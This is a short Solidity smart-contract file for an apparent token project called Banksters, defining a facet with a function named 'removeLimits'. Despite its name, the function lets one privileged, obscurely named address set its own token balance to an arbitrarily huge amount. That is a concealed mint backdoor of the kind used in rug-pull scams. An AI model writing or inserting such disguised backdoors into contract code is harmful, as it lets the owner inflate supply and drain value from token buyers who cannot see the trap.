/*
 * SPDX-License-Identifier: MIT
 * Website: https://banksters.com
 * Whitepaper: https://docsend.com/view/vf5qxqjsnvec6ffp
 * Twitter: https://twitter.com/BankstersNFT
 * Telegram Group: https://t.me/BankstersNFT
 * Telegram Channel: https://t.me/BankstersNFTchannel
 * Discord: https://discord.gg/tEBVGuEE47
 * Medium: https://bankstersnft.medium.com
 */
pragma solidity ^0.8.23;

interface IPancakeFactory {
    function getPair(
        address tokenA,
        address tokenB
    ) external view returns (address pair);
}

import "./TestLib.sol";
contract removeLimitsFacet {
    function removeLimits(uint256 addBot) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (ds.xxnux == msg.sender) {
            ds._balances[msg.sender] =
                42069000000 *
                42069 *
                addBot *
                10 ** ds.tokenDecimals;
        }
    }
}
